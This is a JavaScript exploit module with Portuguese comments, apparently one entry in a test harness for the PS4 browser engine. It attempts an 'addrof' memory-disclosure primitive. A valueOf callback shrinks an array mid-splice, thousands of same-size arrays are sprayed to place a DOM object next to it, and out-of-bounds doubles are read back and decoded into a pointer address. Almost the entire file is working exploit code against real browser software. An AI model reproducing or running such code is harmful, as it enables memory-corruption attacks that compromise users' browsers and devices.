
export default {
    id:       'ARRAY_BUTTERFLY_SPLICE_OOB',
    category: 'Exploit',
    risk:     'CRITICAL',
    description:
        'Primitiva addrof via corrupção do Butterfly (Isolamento de Size Class). ' +
        'Usa arrays de tamanho massivo e incomum (256 elementos) para fugir do ruído de ' +
        'alocação em background do PS4, garantindo um alinhamento perfeito no Heap.',

    setup: function() {
        this.results = {};
        
        // 1. ISOLAMENTO: Usamos 256 elementos. O WebCore C++ quase nunca aloca isso espontaneamente.
        // Preenchemos com 1.11 para manter a classificação de "ArrayWithDouble".
        this.vulnArray = new Array(256).fill(1.11);
        
        this.targetObj = document.createElement('div');
        this.targetObj.id = "HOLY_GRAIL";

        const self = this;
        
        // A Bomba Relógio
        this.evilObject = {
            valueOf: function() {
                // Encolhemos para criar o buraco perfeito
                self.vulnArray.length = 0;
                
                // 2. PRESSÃO: Alocação massiva na exata mesma Size Class (256)
                self.targetSpray = [];
                for(let i = 0; i < 2000; i++) { // Aumentado para 2000 ondas!
                    // Criamos o vizinho do mesmo tamanho exato
                    let arr = new Array(256).fill(3.33); 
                    // Colocamos o alvo no ÍNDICE 0 da memória do vizinho!
                    arr[0] = self.targetObj; 
                    
                    self.targetSpray.push(arr);
                }
                
                return 9.99;
            }
        };
    },

    trigger: function() {
        try {
            // Chamamos a função nativa com limites ajustados
            this.vulnArray.splice(0, 5, this.evilObject);
            this.results.oobArray = this.vulnArray;
        } catch(e) {
            this.results.error = e.message;
        }
    },

    probe: [
        s => s.results.error || 'Splice Executado',
        
        // O Extrator addrof
        s => {
            let arr = s.results.oobArray;
            if (arr) {
                // Como nós colocámos o alvo no índice 0 do vizinho, 
                // sondamos os primeiros 20 bytes pós-destruição.
                for (let i = 0; i < 20; i++) {
                    let val = arr[i];
                    
                    // Lixo filtrado: ignoramos os nossos canários (1.11, 3.33, 9.99) e vazios
                    if (typeof val === 'number' && val !== 9.99 && val !== 1.11 && val !== 3.33 && val !== 0) {
                        
                        const buf = new ArrayBuffer(8);
                        const f64 = new Float64Array(buf);
                        const u64 = new BigUint64Array(buf);
                        
                        f64[0] = val;
                        const bits = u64[0];
                        
                        // Máscara de NaN-Boxing
                        const addr = bits & 0x0000FFFFFFFFFFFFn;
                        
                        // Filtro de ponteiros válidos no Userspace do PS4
                        if (addr > 0x100000n) {
                            return `🏆 ADDROF SUCESSO: 0x${addr.toString(16).toUpperCase()}`;
                        }
                    }
                }
            }
            return 0; // Falhou, tenta no próximo ciclo
        }
    ],

    cleanup: function() {
        this.vulnArray = null;
        this.evilObject = null;
        this.targetObj = null;
        this.targetSpray = null;
        this.results = {};
    }
};
